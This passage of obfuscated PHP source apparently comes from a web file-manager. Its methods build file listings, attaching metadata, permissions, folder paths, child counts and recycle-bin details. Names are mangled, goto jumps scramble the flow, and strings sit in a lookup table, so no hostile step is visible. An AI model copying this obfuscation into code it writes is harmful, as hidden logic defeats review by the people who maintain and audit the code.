$this->_listAppendMeta($c–™‹ÃŠ£¿, $cËì¼Šà); $this->_listAppendFileMeta($c–™‹ÃŠ£¿, $cËì¼Šà); $this->_listAppendChildren($c–™‹ÃŠ£¿, $cËì¼Šà); } goto aÒøó§„Ü”; aÒøó§„Ü”: $this->_listAppendPath($c–™‹ÃŠ£¿); $this->_listAppendAuth($c–™‹ÃŠ£¿); $this->_listAppendSourceInfo($c–™‹ÃŠ£¿, $cËì¼Šà); goto d³¦‰‘Ú; d³¦‰‘Ú: $this->_listAppendUser($c–™‹ÃŠ£¿); $this->_listFilterInfo($c–™‹ÃŠ£¿, $e“Ë³ŞùÆƒ); goto B†¶ôíŠèå; B†¶ôíŠèå: } protected function _listSourceCache($eâÓÜ£¥Ö‘) { $féÚòóÖâß =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($eâÓÜ£¥Ö‘ as $bšÃ¾ğ–Â) { self::$cacheSourceInfo[$féÚòóÖâß[441] . $bšÃ¾ğ–Â[$féÚòóÖâß[399]]] = $bšÃ¾ğ–Â; } } protected function _listFilterInfo(&$DÎË÷°ëí², $D‡ÛŸ¶ÈÉ = false) { $BéÁç¸‹¾Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($DÎË÷°ëí² as &$bÖ¯è³Ç¾¼) { $bÖ¯è³Ç¾¼ = $this->pathInfoFilter($bÖ¯è³Ç¾¼); self::$cachePathInfo[$BéÁç¸‹¾Š[442] . intval($D‡ÛŸ¶ÈÉ) . $BéÁç¸‹¾Š[443] . $bÖ¯è³Ç¾¼[$BéÁç¸‹¾Š[399]]] = $bÖ¯è³Ç¾¼; } unset($bÖ¯è³Ç¾¼); } protected function _listMake(&$eôì”ÕÂ²) { $eÓÒÑˆ¬ôß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eôì”ÕÂ²[$eÓÒÑˆ¬ôß[84]] = array(); $eôì”ÕÂ²[$eÓÒÑˆ¬ôß[83]] = array(); foreach ($eôì”ÕÂ²[$eÓÒÑˆ¬ôß[375]] as $aÑÁŠÒÒ‹™) { $EÁ‡ê“‹¼¡ = $aÑÁŠÒÒ‹™[$eÓÒÑˆ¬ôß[406]] == 1 ? $eÓÒÑˆ¬ôß[84] : $eÓÒÑˆ¬ôß[83]; $eôì”ÕÂ²[$EÁ‡ê“‹¼¡][] = $aÑÁŠÒÒ‹™; } unset($eôì”ÕÂ²[$eÓÒÑˆ¬ôß[375]]); } protected function _listAppendMeta(&$C³…ÆÆòö‚, $C“ãÅ¼…Ê´) { goto e²Çêçõø‹; E„´ŠŠĞÕ‰: if (!$AÕ™’Ä§¸) { return; } $Có¥Û‹°¬ = array($FİÚë¤ÊÛÍ[446], $FİÚë¤ÊÛÍ[447]); $AŠ©ŠÜ³ïß = array(); goto CÏÖÕ‡¿«—; CÏÖÕ‡¿«—: foreach ($AÕ™’Ä§¸ as $a”§îÚåÉ) { if (!isset($AŠ©ŠÜ³ïß[$a”§îÚåÉ[$FİÚë¤ÊÛÍ[399]]])) { $AŠ©ŠÜ³ïß[$a”§îÚåÉ[$FİÚë¤ÊÛÍ[399]]] = array(); } if (in_array($a”§îÚåÉ[$FİÚë¤ÊÛÍ[102]], $Có¥Û‹°¬)) { continue; } $AŠ©ŠÜ³ïß[$a”§îÚåÉ[$FİÚë¤ÊÛÍ[399]]][$a”§îÚåÉ[$FİÚë¤ÊÛÍ[102]]] = $a”§îÚåÉ[$FİÚë¤ÊÛÍ[380]]; } foreach ($C³…ÆÆòö‚ as &$E´ø„ñ§) { $E´ø„ñ§[$FİÚë¤ÊÛÍ[448]] = !1; if (isset($AŠ©ŠÜ³ïß[$E´ø„ñ§[$FİÚë¤ÊÛÍ[399]]])) { $E´ø„ñ§[$FİÚë¤ÊÛÍ[448]] = $AŠ©ŠÜ³ïß[$E´ø„ñ§[$FİÚë¤ÊÛÍ[399]]]; } if ($this->fileIsLock($E´ø„ñ§) && $E´ø„ñ§[$FİÚë¤ÊÛÍ[409]]) { $d‘™ºÉàÔ¡ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $E´ø„ñ§[$FİÚë¤ÊÛÍ[409]][$FİÚë¤ÊÛÍ[410]] = AuthModel::authDisable($E´ø„ñ§[$FİÚë¤ÊÛÍ[409]][$FİÚë¤ÊÛÍ[410]], $d‘™ºÉàÔ¡); $E´ø„ñ§[$FİÚë¤ÊÛÍ[409]][$FİÚë¤ÊÛÍ[449]][$FİÚë¤ÊÛÍ[409]] = $E´ø„ñ§[$FİÚë¤ÊÛÍ[409]][$FİÚë¤ÊÛÍ[410]]; } } unset($E´ø„ñ§); goto AÑÃÔéÌà…; e²Çêçõø‹: $FİÚë¤ÊÛÍ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÁ£½ğæŠ¨ = array($FİÚë¤ÊÛÍ[413] => array($FİÚë¤ÊÛÍ[414], $C“ãÅ¼…Ê´)); $AÕ™’Ä§¸ = Model($FİÚë¤ÊÛÍ[444])->field($FİÚë¤ÊÛÍ[445])->where($EÁ£½ğæŠ¨)->select(); goto E„´ŠŠĞÕ‰; AÑÃÔéÌà…: } protected function _listAppendFileMeta(&$E¹Ï„òğËÑ, $BÏ…’ä¡·â) { goto d„ºÃö‘»Â; C¤£–‚ëë¡: if (!$d÷¶‰¯‘µÍ) { return; } $d ‚Å¼•äº = array($eº÷¹…µÖ˜[451] => array($eº÷¹…µÖ˜[414], $d÷¶‰¯‘µÍ)); $BğˆŒø‡—Ê = $eº÷¹…µÖ˜[452]; goto B£Ú¬¨á÷; D‘–İ»âÓ: foreach ($E¹Ï„òğËÑ as &$c÷¶Ï¤§ßø) { goto F¬‹Ò¥´îŒ; eŸ½¸ùã: $Cõ”–›ö­[$eº÷¹…µÖ˜[87]] = $c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[87]]; $Cõ”–›ö­[$eº÷¹…µÖ˜[28]] = $c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[28]]; if (!isset(self::$cacheFileInfo[$eº÷¹…µÖ˜[456] . $eÉË¾¨Ú®])) { self::$cacheFileInfo[$eº÷¹…µÖ˜[456] . $eÉË¾¨Ú®] = array_merge(array(), $Cõ”–›ö­); } goto f¬İ°–¢Å; F¬‹Ò¥´îŒ: $eÉË¾¨Ú® = $c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[450]]; if (!$eÉË¾¨Ú® || !is_array($d¤‚„‘Ôˆì[$eÉË¾¨Ú®])) { continue; } $Cõ”–›ö­ = $d¤‚„‘Ôˆì[$eÉË¾¨Ú®]; goto eŸ½¸ùã; f¬İ°–¢Å: unset($d¤‚„‘Ôˆì[$eÉË¾¨Ú®][$eº÷¹…µÖ˜[85]]); $FÍÛ‹»÷«È = is_array($FŒÑ˜¹¡•”[$eÉË¾¨Ú®]) ? $FŒÑ˜¹¡•”[$eÉË¾¨Ú®] : array(); $c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[173]] = array_merge($FÍÛ‹»÷«È, $d¤‚„‘Ôˆì[$eÉË¾¨Ú®]); goto bœîÈ½·²’; bœîÈ½·²’: if (isset($c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[173]][$eº÷¹…µÖ˜[172]])) { $c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[172]] = json_decode($c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[173]][$eº÷¹…µÖ˜[172]], !0); unset($c÷¶Ï¤§ßø[$eº÷¹…µÖ˜[173]][$eº÷¹…µÖ˜[172]]); } goto BÓ±êöŞçã; BÓ±êöŞçã: } unset($c÷¶Ï¤§ßø); goto a»‚Ûİˆ; A“Ç›ìÚÜ: $D¹àœŞãôç = $D¹àœŞãôç ? $D¹àœŞãôç : array(); $FŒÑ˜¹¡•” = array(); foreach ($D¹àœŞãôç as $a¬Ù™…ƒ®×) { if (!isset($FŒÑ˜¹¡•”[$a¬Ù™…ƒ®×[$eº÷¹…µÖ˜[450]]])) { $FŒÑ˜¹¡•”[$a¬Ù™…ƒ®×[$eº÷¹…µÖ˜[450]]] = array(); } $FŒÑ˜¹¡•”[$a¬Ù™…ƒ®×[$eº÷¹…µÖ˜[450]]][$a¬Ù™…ƒ®×[$eº÷¹…µÖ˜[102]]] = $a¬Ù™…ƒ®×[$eº÷¹…µÖ˜[380]]; } goto D‘–İ»âÓ; B£Ú¬¨á÷: $d¤‚„‘Ôˆì = Model($eº÷¹…µÖ˜[453])->field($BğˆŒø‡—Ê)->where($d ‚Å¼•äº)->select(); $d¤‚„‘Ôˆì = array_to_keyvalue($d¤‚„‘Ôˆì, $eº÷¹…µÖ˜[450]); $D¹àœŞãôç = Model($eº÷¹…µÖ˜[454])->field($eº÷¹…µÖ˜[455])->where($d ‚Å¼•äº)->select(); goto A“Ç›ìÚÜ; d„ºÃö‘»Â: $eº÷¹…µÖ˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d÷¶‰¯‘µÍ = array_to_keyvalue($E¹Ï„òğËÑ, $eº÷¹…µÖ˜[33], $eº÷¹…µÖ˜[450]); $d÷¶‰¯‘µÍ = array_filter(array_unique($d÷¶‰¯‘µÍ)); goto C¤£–‚ëë¡; a»‚Ûİˆ: } protected function _listAppendSourceInfo(&$DåäŠš’šÀ, $eòã÷™ÚĞ¨) { goto EÔè†É¹É«; Aøè²ÂÜ²: $fè³†’³èÌ = Model($f†ˆŒ¸É[421])->listData(); $céøİí›† = Model($f†ˆŒ¸É[411])->listData(); $dÀ›Âƒ„“ = Model($f†ˆŒ¸É[459])->listSimple(); goto CÕµ£‡¹Ê­; bÚŞÙƒÙ‚: return $DåäŠš’šÀ; goto BŞ”²Î¡¦; EÔè†É¹É«: $f†ˆŒ¸É =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!defined($f†ˆŒ¸É[457])) { return; } $EœÌå¨öáµ = Model($f†ˆŒ¸É[458])->listData(); goto Aøè²ÂÜ²; eİÚ°ùÂß¨: $e½²ÔÊ‡Õ = array_to_keyvalue_group($dÀ›Âƒ„“, $f†ˆŒ¸É[399]); foreach ($DåäŠš’šÀ as &$d÷¬‚ÕéÓà) { $d÷¬‚ÕéÓà[$f†ˆŒ¸É[94]] = array($f†ˆŒ¸É[460] => 0, $f†ˆŒ¸É[461] => 0, $f†ˆŒ¸É[462] => 0); if (isset($DÊğ¥Ä¡¦Ô[$d÷¬‚ÕéÓà[$f†ˆŒ¸É[399]]])) { $d÷¬‚ÕéÓà[$f†ˆŒ¸É[94]][$f†ˆŒ¸É[463]] = 1; $d÷¬‚ÕéÓà[$f†ˆŒ¸É[94]][$f†ˆŒ¸É[464]] = $DÊğ¥Ä¡¦Ô[$d÷¬‚ÕéÓà[$f†ˆŒ¸É[399]]][$f†ˆŒ¸É[28]]; } if (isset($B‰ï°’‚˜ˆ[$d÷¬‚ÕéÓà[$f†ˆŒ¸É[399]]])) { $d÷¬‚ÕéÓà[$f†ˆŒ¸É[94]][$f†ˆŒ¸É[465]] = array(); foreach ($B‰ï°’‚˜ˆ[$d÷¬‚ÕéÓà[$f†ˆŒ¸É[399]]] as $E¯ò«¨ØÆ) { $a»…ò¯¥Ü = $dŒ˜ÈÖÅ[$E¯ò«¨ØÆ]; $d÷¬‚ÕéÓà[$f†ˆŒ¸É[94]][$f†ˆŒ¸É[465]][] = array($f†ˆŒ¸É[466] => $a»…ò¯¥Ü[$f†ˆŒ¸É[397]], $f†ˆŒ¸É[416] => $a»…ò¯¥Ü[$f†ˆŒ¸É[28]], $f†ˆŒ¸É[467] => $a»…ò¯¥Ü[$f†ˆŒ¸É[468]]); } } if (isset($e½²ÔÊ‡Õ[$d÷¬‚ÕéÓà[$f†ˆŒ¸É[399]]])) { $d÷¬‚ÕéÓà[$f†ˆŒ¸É[94]][$f†ˆŒ¸É[469]] = array(); foreach ($e½²ÔÊ‡Õ[$d÷¬‚ÕéÓà[$f†ˆŒ¸É[399]]] as $Aó¸ˆ·…¤Å) { $d÷¬‚ÕéÓà[$f†ˆŒ¸É[94]][$f†ˆŒ¸É[469]] = array($f†ˆŒ¸É[470] => $Aó¸ˆ·…¤Å[$f†ˆŒ¸É[471]], $f†ˆŒ¸É[472] => $Aó¸ˆ·…¤Å[$f†ˆŒ¸É[473]], $f†ˆŒ¸É[474] => $Aó¸ˆ·…¤Å[$f†ˆŒ¸É[399]], $f†ˆŒ¸É[475] => $Aó¸ˆ·…¤Å[$f†ˆŒ¸É[476]], $f†ˆŒ¸É[477] => $Aó¸ˆ·…¤Å[$f†ˆŒ¸É[478]], $f†ˆŒ¸É[479] => $Aó¸ˆ·…¤Å[$f†ˆŒ¸É[479]], $f†ˆŒ¸É[480] => $Aó¸ˆ·…¤Å[$f†ˆŒ¸É[480]]); } } } unset($d÷¬‚ÕéÓà); goto bÚŞÙƒÙ‚; CÕµ£‡¹Ê­: $dŒ˜ÈÖÅ = array_to_keyvalue($EœÌå¨öáµ, $f†ˆŒ¸É[397]); $B‰ï°’‚˜ˆ = array_to_keyvalue_group($fè³†’³èÌ, $f†ˆŒ¸É[85], $f†ˆŒ¸É[422]); $DÊğ¥Ä¡¦Ô = array_to_keyvalue($céøİí›†, $f†ˆŒ¸É[85]); goto eİÚ°ùÂß¨; BŞ”²Î¡¦: } protected function _listAppendChildren(&$B°ˆŒæˆ, $cìªÁ×õ†) { goto bæÏÔ®¬ÕÂ; FŠÍè©‰ìº: unset($bÄƒ–ªÙù¾); goto AÄ« ƒß¼ó; dÉ¬±Ë†È‚: foreach ($B°ˆŒæˆ as &$bÄƒ–ªÙù¾) { if (!$bÄƒ–ªÙù¾[$e™Æ‘“Ò†[406]]) { continue; } $dŒ‘Ü¾÷»Ê[] = $bÄƒ–ªÙù¾[$e™Æ‘“Ò†[399]]; } unset($bÄƒ–ªÙù¾); if (!$dŒ‘Ü¾÷»Ê) { return; } goto EÓÖœò¤Ó; bæÏÔ®¬ÕÂ: $e™Æ‘“Ò† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dŒ‘Ü¾÷»Ê = array(); $F«çÈÌšËÓ = array($e™Æ‘“Ò†[211] => 0, $e™Æ‘“Ò†[212] => 0); goto dÉ¬±Ë†È‚; EÓÖœò¤Ó: $Bì´³«ÁË = array($e™Æ‘“Ò†[481] => array($e™Æ‘“Ò†[7], $dŒ‘Ü¾÷»Ê)); $BÃ‰ƒ™Ö†÷ = array($e™Æ‘“Ò†[481], $e™Æ‘“Ò†[406], $e™Æ‘“Ò†[482] => $e™Æ‘“Ò†[483]); $aÒ¼Œ°ŒÉ£ = $this->field($BÃ‰ƒ™Ö†÷)->where($Bì´³«ÁË)->group($e™Æ‘“Ò†[484])->select(); goto fâî’–ö§ê; fâî’–ö§ê: $B×øİ”š…† = array(); foreach ($aÒ¼Œ°ŒÉ£ as $d¥áæïŒ’±) { $bíÏ¡©†Š… = $d¥áæïŒ’±[$e™Æ‘“Ò†[481]]; $eìà‘·ÁÆ = $d¥áæïŒ’±[$e™Æ‘“Ò†[406]] == $e™Æ‘“Ò†[96] ? $e™Æ‘“Ò†[212] : $e™Æ‘“Ò†[211]; if (!isset($B×øİ”š…†[$bíÏ¡©†Š…])) { $B×øİ”š…†[$bíÏ¡©†Š…] = array($e™Æ‘“Ò†[211] => 0, $e™Æ‘“Ò†[212] => 0); } $B×øİ”š…†[$bíÏ¡©†Š…][$eìà‘·ÁÆ] += $d¥áæïŒ’±[$e™Æ‘“Ò†[483]]; } foreach ($B°ˆŒæˆ as &$bÄƒ–ªÙù¾) { if (!$bÄƒ–ªÙù¾[$e™Æ‘“Ò†[406]]) { continue; } $aí—¢ÍÚî¬ = is_array($B×øİ”š…†[$bÄƒ–ªÙù¾[$e™Æ‘“Ò†[399]]]) ? $B×øİ”š…†[$bÄƒ–ªÙù¾[$e™Æ‘“Ò†[399]]] : $F«çÈÌšËÓ; $bÄƒ–ªÙù¾[$e™Æ‘“Ò†[212]] = $aí—¢ÍÚî¬[$e™Æ‘“Ò†[212]]; $bÄƒ–ªÙù¾[$e™Æ‘“Ò†[211]] = $aí—¢ÍÚî¬[$e™Æ‘“Ò†[211]]; unset($bÄƒ–ªÙù¾[$e™Æ‘“Ò†[408]]); } goto FŠÍè©‰ìº; AÄ« ƒß¼ó: } protected function _listAppendAuth(&$A©„ç¤ÙÁ ) { goto có‚–İ­ã†; bœõÃº³İ: foreach ($A©„ç¤ÙÁ  as $EŞÉõçŞÌò) { if ($EŞÉõçŞÌò[$bóŞ­áàøÑ[407]] == self::TYPE_GROUP) { $aÄÓˆÖ¯¾°[] = $EŞÉõçŞÌò[$bóŞ­áàøÑ[399]]; } } if (!$aÄÓˆÖ¯¾°) { return; } $D¹äß´Š = array_to_keyvalue($A©„ç¤ÙÁ , $bóŞ­áàøÑ[399]); goto aĞà‘Î³ïŸ; có‚–İ­ã†: $bóŞ­áàøÑ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!defined($bóŞ­áàøÑ[457])) { return; } $aÄÓˆÖ¯¾° = array(); goto bœõÃº³İ; aĞà‘Î³ïŸ: $E¶ë‹¢ÀÆÁ = Model($bóŞ­áàøÑ[485])->getSourceList($aÄÓˆÖ¯¾°, $D¹äß´Š); foreach ($A©„ç¤ÙÁ  as $bè¡Ìâ•êÏ => &$EŞÉõçŞÌò) { $EŞÉõçŞÌò[$bóŞ­áàøÑ[409]] = $E¶ë‹¢ÀÆÁ[$EŞÉõçŞÌò[$bóŞ­áàøÑ[399]]]; if (!$EŞÉõçŞÌò[$bóŞ­áàøÑ[409]] && $EŞÉõçŞÌò[$bóŞ­áàøÑ[407]] == self::TYPE_GROUP) { $EŞÉõçŞÌò[$bóŞ­áàøÑ[409]] = Action($bóŞ­áàøÑ[486])->pathGroupAuthMake($EŞÉõçŞÌò[$bóŞ­áàøÑ[487]]); if (!$EŞÉõçŞÌò[$bóŞ­áàøÑ[409]] && !_get($GLOBALS, $bóŞ­áàøÑ[488])) { $EŞÉõçŞÌò[$bóŞ­áàøÑ[204]] = !1; $EŞÉõçŞÌò[$bóŞ­áàøÑ[203]] = !1; } } if ($EŞÉõçŞÌò[$bóŞ­áàøÑ[409]]) { $EŞÉõçŞÌò[$bóŞ­áàøÑ[204]] = AuthModel::authCheckEdit($EŞÉõçŞÌò[$bóŞ­áàøÑ[409]][$bóŞ­áàøÑ[410]]); $EŞÉõçŞÌò[$bóŞ­áàøÑ[203]] = AuthModel::authCheckView($EŞÉõçŞÌò[$bóŞ­áàøÑ[409]][$bóŞ­áàøÑ[410]]); } $this->groupPathDisplay($EŞÉõçŞÌò); } unset($EŞÉõçŞÌò); goto cã…Ÿí‡Ò; cã…Ÿí‡Ò: } public function groupPathDisplay(&$bËŸ¼òÆ¯) { goto Cäõç£ëœ; C‚Ğ’ ÕˆŠ: $bËŸ¼òÆ¯[$C‚ğ§Ïëëó[491]] = $eßÌÖ”›á[$C‚ğ§Ïëëó[481]]; $bËŸ¼òÆ¯[$C‚ğ§Ïëëó[492]] = $eßÌÖ”›á[$C‚ğ§Ïëëó[490]]; $bËŸ¼òÆ¯[$C‚ğ§Ïëëó[493]] = $eßÌÖ”›á[$C‚ğ§Ïëëó[494]]; goto a£„©Î×‘›; aºŞÂœ•: $d¨ùñÏµñß = $this->parentLevelArray($eßÌÖ”›á[$C‚ğ§Ïëëó[490]]); $A»Áâ­« = $C‚ğ§Ïëëó[33]; foreach ($d¨ùñÏµñß as $AğÃí‚„åÇ) { $bîßß®‚Œ = Model($C‚ğ§Ïëëó[489])->getInfo($AğÃí‚„åÇ); $A»Áâ­« .= $bîßß®‚Œ[$C‚ğ§Ïëëó[94]][$C‚ğ§Ïëëó[399]] . $C‚ğ§Ïëëó[47]; } goto C‚Ğ’ ÕˆŠ; Cäõç£ëœ: $C‚ğ§Ïëëó =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($bËŸ¼òÆ¯[$C‚ğ§Ïëëó[407]] != self::TYPE_GROUP) { return; } $eßÌÖ”›á = Model($C‚ğ§Ïëëó[489])->getInfo($bËŸ¼òÆ¯[$C‚ğ§Ïëëó[487]]); goto aºŞÂœ•; a£„©Î×‘›: $bËŸ¼òÆ¯[$C‚ğ§Ïëëó[495]] = $A»Áâ­« . $eßÌÖ”›á[$C‚ğ§Ïëëó[94]][$C‚ğ§Ïëëó[399]]; goto CæºƒÙ×Â‡; CæºƒÙ×Â‡: } protected function _listAppendPath(&$c¡‘ÛêèİÖ) { goto Fã÷à¶ö“é; Fã÷à¶ö“é: $A¡æë‹íî =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $cŸ‚Šõ‘¦ = array(); $A®ö¬ñÌ‹  = array(); goto BŠÏäÁØ†; BŠÏäÁØ†: $aÀ‚¤…¹‚Æ = array(); foreach ($c¡‘ÛêèİÖ as &$Eãø¯…‰¤) { $E¿ŠôÛé¥‰ = $Eãø¯…‰¤[$A¡æë‹íî[406]] == $A¡æë‹íî[96]; if ($E¿ŠôÛé¥‰) { $cŸ‚Šõ‘¦[$Eãø¯…‰¤[$A¡æë‹íî[399]]] = $Eãø¯…‰¤[$A¡æë‹íî[28]]; } if (isset($aÀ‚¤…¹‚Æ[$Eãø¯…‰¤[$A¡æë‹íî[490]]])) { continue; } $aÀ‚¤…¹‚Æ[$Eãø¯…‰¤[$A¡æë‹íî[490]]] = !0; $E„ìŸ—¯Óç = $this->parentLevelArray($Eãø¯…‰¤[$A¡æë‹íî[490]]); foreach ($E„ìŸ—¯Óç as $b´ğÖ¼Çã˜ => $AÕ¥†°Š¢Ö) { if ($b´ğÖ¼Çã˜ != 0 && !isset($cŸ‚Šõ‘¦[$AÕ¥†°Š¢Ö])) { $A®ö¬ñÌ‹ [] = $AÕ¥†°Š¢Ö; } } } unset($Eãø¯…‰¤); goto cÆùâ†®•; cÆùâ†®•: $A®ö¬ñÌ‹  = array_unique($A®ö¬ñÌ‹ ); if (count($A®ö¬ñÌ‹ ) > 0) { $cÆŠ»È´öÒ = array($A¡æë‹íî[413] => array($A¡æë‹íî[414], $A®ö¬ñÌ‹ )); if (count($A®ö¬ñÌ‹ ) == 1) { $a­ïøÇ‹í = $this->sourceInfo($A®ö¬ñÌ‹ [0]); $B˜öòÁÍê³ = is_array($a­ïøÇ‹í) ? array($a­ïøÇ‹í) : !1; } else { $B˜öòÁÍê³ = $this->field($A¡æë‹íî[496])->where($cÆŠ»È´öÒ)->select(); } if (!$B˜öòÁÍê³) { $B˜öòÁÍê³ = array(); } foreach ($B˜öòÁÍê³ as $AİÌ‹ôöšà) { $cŸ‚Šõ‘¦[$AİÌ‹ôöšà[$A¡æë‹íî[399]]] = $AİÌ‹ôöšà[$A¡æë‹íî[28]]; } } $CÁ«¹¸‹”Ä = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto eóˆ†Í«Ã; eóˆ†Í«Ã: $BÃ–ïÏñİš = array(); $dÜÁ‚‚À—ö = array(); foreach ($c¡‘ÛêèİÖ as &$Eãø¯…‰¤) { goto Bñœ×ÏÔ‘; cë“ó¦åÜß: if (intval($Eãø¯…‰¤[$A¡æë‹íî[407]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Eãø¯…‰¤, $E„ìŸ—¯Óç, $CÁ«¹¸‹”Ä); } goto Dõµ·‰‹ “; CÄ‹‹¸ÚÙÓ: $Eãø¯…‰¤[$A¡æë‹íî[498]] = str_replace($A¡æë‹íî[499], $A¡æë‹íî[8], $AĞ„ÔÜÅÊ); $DÅ—à¸’¸Ï = trim($Eãø¯…‰¤[$A¡æë‹íî[498]], $A¡æë‹íî[8]); if ($Eãø¯…‰¤[$A¡æë‹íî[481]] == $A¡æë‹íî[500] && $DÅ—à¸’¸Ï) { $Eãø¯…‰¤[$A¡æë‹íî[28]] = $DÅ—à¸’¸Ï; } goto cë“ó¦åÜß; Bñœ×ÏÔ‘: $BŞéø„¿× = $Eãø¯…‰¤[$A¡æë‹íî[490]]; if (isset($dÜÁ‚‚À—ö[$BŞéø„¿×])) { $AĞ„ÔÜÅÊ = $BÃ–ïÏñİš[$BŞéø„¿×]; } else { $E„ìŸ—¯Óç = $this->parentLevelArray($Eãø¯…‰¤[$A¡æë‹íî[490]]); $b‘Óó”›è± = $A¡æë‹íî[497] . $Eãø¯…‰¤[$A¡æë‹íî[407]] . $A¡æë‹íî[443] . $Eãø¯…‰¤[$A¡æë‹íî[487]]; if ($BÃ–ïÏñİš[$b‘Óó”›è±]) { $AĞ„ÔÜÅÊ = $BÃ–ïÏñİš[$b‘Óó”›è±]; } else { $AĞ„ÔÜÅÊ = $this->_listAppendPathRoot($Eãø¯…‰¤, $E„ìŸ—¯Óç); $BÃ–ïÏñİš[$b‘Óó”›è±] = $AĞ„ÔÜÅÊ; } foreach ($E„ìŸ—¯Óç as $b´ğÖ¼Çã˜ => $AÕ¥†°Š¢Ö) { if ($b´ğÖ¼Çã˜ == 0 && $AĞ„ÔÜÅÊ && $Eãø¯…‰¤[$A¡æë‹íî[407]] == self::TYPE_GROUP) { continue; } if (isset($cŸ‚Šõ‘¦[$AÕ¥†°Š¢Ö])) { $AĞ„ÔÜÅÊ .= $cŸ‚Šõ‘¦[$AÕ¥†°Š¢Ö] . $A¡æë‹íî[8]; } } if ($E„ìŸ—¯Óç) { $AĞ„ÔÜÅÊ .= $Eãø¯…‰¤[$A¡æë‹íî[28]]; } $BÃ–ïÏñİš[$BŞéø„¿×] = $AĞ„ÔÜÅÊ; } if ($Eãø¯…‰¤[$A¡æë‹íî[406]]) { $AĞ„ÔÜÅÊ .= $A¡æë‹íî[8]; } goto CÄ‹‹¸ÚÙÓ; Dõµ·‰‹ “: } goto E‡¸É™¨”ƒ; E‡¸É™¨”ƒ: unset($Eãø¯…‰¤); return $c¡‘ÛêèİÖ; goto dÈÅÉÛÖŒº; dÈÅÉÛÖŒº: } private function _listAppendPathRecycle(&$C‰µöµóÍ‹, $C”ä„± ¼», $AçÈ¤áî–Ç) { goto b‚®İ×š‘Î; e·ÎŞç»Ñ¹: $Bª¯Û‹…Á† = implode($EäšùÂ®„Ù[8], array_slice($E™¢œôùŒõ, 2)); $C‰µöµóÍ‹[$EäšùÂ®„Ù[498]] = $EäšùÂ®„Ù[8] . LNG($EäšùÂ®„Ù[501]) . $EäšùÂ®„Ù[8] . ltrim($Bª¯Û‹…Á†, $EäšùÂ®„Ù[8]); $C‰µöµóÍ‹[$EäšùÂ®„Ù[490]] = $EäšùÂ®„Ù[502] . implode($EäšùÂ®„Ù[47], array_slice($C”ä„± ¼», 1)) . $EäšùÂ®„Ù[47]; goto b›ç°‹‰‡Ş; b›ç°‹‰‡Ş: if ($C‰µöµóÍ‹[$EäšùÂ®„Ù[399]] == $AçÈ¤áî–Ç) { $C‰µöµóÍ‹[$EäšùÂ®„Ù[490]] = $EäšùÂ®„Ù[502]; $C‰µöµóÍ‹[$EäšùÂ®„Ù[481]] = $EäšùÂ®„Ù[500]; $C‰µöµóÍ‹[$EäšùÂ®„Ù[28]] = LNG($EäšùÂ®„Ù[501]); } $C‰µöµóÍ‹[$EäšùÂ®„Ù[503]] = $EäšùÂ®„Ù[504]; goto fòÑ¡äíÍÜ; b‚®İ×š‘Î: $EäšùÂ®„Ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!in_array($AçÈ¤áî–Ç, $C”ä„± ¼») && $C‰µöµóÍ‹[$EäšùÂ®„Ù[399]] != $AçÈ¤áî–Ç) { return; } $E™¢œôùŒõ = explode($EäšùÂ®„Ù[8], trim($C‰µöµóÍ‹[$EäšùÂ®„Ù[498]], $EäšùÂ®„Ù[8])); goto e·ÎŞç»Ñ¹; fòÑ¡äíÍÜ: } protected function _listAppendPathRoot(&$A¿Ù¬ç–†ª, $FØ‰åç·øâ) { $AâŠœ·×¤ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aŠí§Äù½ƒ = $AâŠœ·×¤[33]; if ($A¿Ù¬ç–†ª[$AâŠœ·×¤[407]] == self::TYPE_USER) { if (defined($AâŠœ·×¤[457]) && $A¿Ù¬ç–†ª[$AâŠœ·×¤[487]] == USER_ID) { $aŠí§Äù½ƒ = LNG($AâŠœ·×¤[505]); if (!$FØ‰åç·øâ) { $A¿Ù¬ç–†ª[$AâŠœ·×¤[28]] = $aŠí§Äù½ƒ; } } else { $aøÙ—÷¼˜ = Model($AâŠœ·×¤[506])->getInfoSimple($A¿Ù¬ç–†ª[$AâŠœ·×¤[487]]); $aŠí§Äù½ƒ = LNG($AâŠœ·×¤[507]) . $AâŠœ·×¤[169] . $aøÙ—÷¼˜[$AâŠœ·×¤[28]] . $AâŠœ·×¤[508]; } } else { if ($A¿Ù¬ç–†ª[$AâŠœ·×¤[407]] == self::TYPE_GROUP) { $aøÙ—÷¼˜ = Model($AâŠœ·×¤[489])->getInfoSimple($A¿Ù¬ç–†ª[$AâŠœ·×¤[487]]); $aŠí§Äù½ƒ = $aøÙ—÷¼˜[$AâŠœ·×¤[28]]; } else { if ($A¿Ù¬ç–†ª[$AâŠœ·×¤[407]] == self::TYPE_SYSTEM) { $aŠí§Äù½ƒ = $AâŠœ·×¤[509]; } } } $aŠí§Äù½ƒ = $aŠí§Äù½ƒ ? $AâŠœ·×¤[8] . $aŠí§Äù½ƒ . $AâŠœ·×¤[8] : $AâŠœ·×¤[8]; return $aŠí§Äù½ƒ; } protected function _listAppendUser(&$bº“ë¿“Ü¡) { goto cÚ×”Ç˜—; cÚ×”Ç˜—: $C†‚Ä‹ñï™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DĞê…ºˆŸ… = array_to_keyvalue($bº“ë¿“Ü¡, $C†‚Ä‹ñï™[33], $C†‚Ä‹ñï™[435]); $FÉùƒš¯ê = array_to_keyvalue($bº“ë¿“Ü¡, $C†‚Ä‹ñï™[33], 